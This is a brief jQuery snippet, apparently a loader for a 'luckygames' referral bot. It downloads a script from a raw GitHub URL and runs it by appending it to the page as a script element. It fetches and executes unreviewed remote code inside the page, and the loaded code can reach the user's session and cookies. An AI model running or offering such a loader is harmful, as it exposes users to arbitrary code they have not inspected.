$.get( "https://raw.githubusercontent.com/EVNEVN/luckygames/master/bot_referral", function( data, textStatus, jqxhr ) {
	document.body.appendChild(document.createElement('script')).text=data;
});
